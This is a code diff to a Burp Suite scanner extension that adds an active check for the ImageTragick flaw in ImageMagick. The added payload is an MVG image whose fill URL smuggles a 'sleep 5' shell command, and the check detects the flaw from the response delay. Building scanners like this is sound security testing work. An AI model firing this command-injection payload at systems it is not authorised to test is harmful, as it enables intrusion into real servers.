@@ -51,10 +51,39 @@ public class BurpExtender implements IBurpExtender, IScannerCheck
 					ri.getUrl(), widthParam, heightParam));
 	}
 
+	final static byte IMAGETRAGICK_SLEEP_SEC = 5;
+	private final static long IMAGETRAGICK_SLEEP_NS = IMAGETRAGICK_SLEEP_SEC * 1000000000L;
+	private final static long IMAGETRAGICK_TRESHOLD_NS = 1000000000L;
+	private final static byte[] IMAGETRAGICK_PAYLOAD = (
+			"push graphic-context\nviewbox 0 0 640 480\n" +
+			"fill 'url(https://127.0.0.0/oops.jpg\"|sleep \"" + IMAGETRAGICK_SLEEP_SEC + ")'\n" +
+			"pop graphic-context\n").getBytes();
+
 	@Override
 	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
 			IScannerInsertionPoint insertionPoint) {
-		return null;
+		final byte[] baseValue = helpers.stringToBytes(insertionPoint.getBaseValue());
+		int[] d = SimpleImageSizeReader.getImageSize(baseValue, 0, baseValue.length);
+		if (d == null) return null;
+		final IHttpService hs = baseRequestResponse.getHttpService();
+		long baseTime = measureRequest(hs, baseRequestResponse.getRequest());
+		long sleepTime = measureRequest(hs, insertionPoint.buildRequest(IMAGETRAGICK_PAYLOAD));
+		if (Math.abs(sleepTime - baseTime - IMAGETRAGICK_SLEEP_NS)
+				> IMAGETRAGICK_TRESHOLD_NS) return null;
+		List<int[]> reqMarkers = Arrays.asList(
+				insertionPoint.getPayloadOffsets(IMAGETRAGICK_PAYLOAD));
+		IRequestInfo ri = helpers.analyzeRequest(baseRequestResponse.getHttpService(),
+				baseRequestResponse.getRequest());
+		return Collections.singletonList((IScanIssue)new ImageTragickIssue(
+					callbacks.applyMarkers(baseRequestResponse, reqMarkers, null),
+					ri.getUrl(), insertionPoint.getInsertionPointName(),
+					baseTime, sleepTime));
+	}
+
+	private long measureRequest(IHttpService httpService, byte[] request) {
+		final long startTime = System.nanoTime();
+		callbacks.makeHttpRequest(httpService, request);
+		return System.nanoTime() - startTime;
 	}
 
 	@Override
